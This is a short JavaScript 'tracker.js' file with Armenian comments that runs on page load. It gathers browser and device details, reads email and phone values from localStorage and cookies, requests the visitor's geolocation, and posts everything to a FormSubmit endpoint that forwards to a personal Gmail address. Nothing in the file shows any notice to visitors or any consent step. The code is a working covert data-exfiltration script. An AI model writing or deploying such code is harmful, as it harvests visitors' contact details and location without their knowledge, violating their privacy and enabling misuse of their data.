// tracker.js - Վիզիտորի տվյալների հավաքում և ուղարկում FormSubmit-ի միջոցով
function trackVisitor() {
    const data = {
      website: window.location.href || "index.html",
      userAgent: navigator.userAgent,
      platform: navigator.platform,
      screenWidth: window.screen.width,
      screenHeight: window.screen.height,
      language: navigator.language,
      referrer: document.referrer || "Direct visit",
      visitTime: new Date().toISOString(),
      ip: "Մոտքային IP-ն կավելացվի FormSubmit-ի կողմից"
    };
  
    // Ստուգել localStorage-ում պահված տվյալները
    try {
      const savedEmail = localStorage.getItem('userEmail');
      const savedPhone = localStorage.getItem('userPhone');
      
      if (savedEmail) data.savedEmail = savedEmail;
      if (savedPhone) data.savedPhone = savedPhone;
    } catch (e) {
      console.log("LocalStorage access error:", e);
    }
  
    // Ստուգել cookies-ում պահված տվյալները
    try {
      const cookies = document.cookie.split(';').reduce((res, c) => {
        const [key, val] = c.trim().split('=').map(decodeURIComponent);
        return Object.assign(res, { [key]: val });
      }, {});
  
      if (cookies.email) data.cookieEmail = cookies.email;
      if (cookies.phone) data.cookiePhone = cookies.phone;
    } catch (e) {
      console.log("Cookie access error:", e);
    }
  
    // Փորձել ստանալ գեոտեղադրություն
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(
        position => {
          data.latitude = position.coords.latitude;
          data.longitude = position.coords.longitude;
          sendData(data);
        },
        () => {
          data.locationError = "Geolocation unavailable";
          sendData(data);
        }
      );
    } else {
      sendData(data);
    }
  }
  
  // Տվյալների ուղարկում FormSubmit-ին
  function sendData(data) {
    fetch("https://formsubmit.co/ajax/soghbatyanvahan@gmail.com", {
      method: "POST",
      headers: { 
        'Content-Type': 'application/json',
        'Accept': 'application/json'
      },
      body: JSON.stringify(data)
    })
    .then(response => response.json())
    .then(data => console.log("Success:", data))
    .catch(error => console.error("Error:", error));
  }
  
  // Գործարկել հետևումը էջի բեռնվելուց հետո
  window.addEventListener('load', trackVisitor);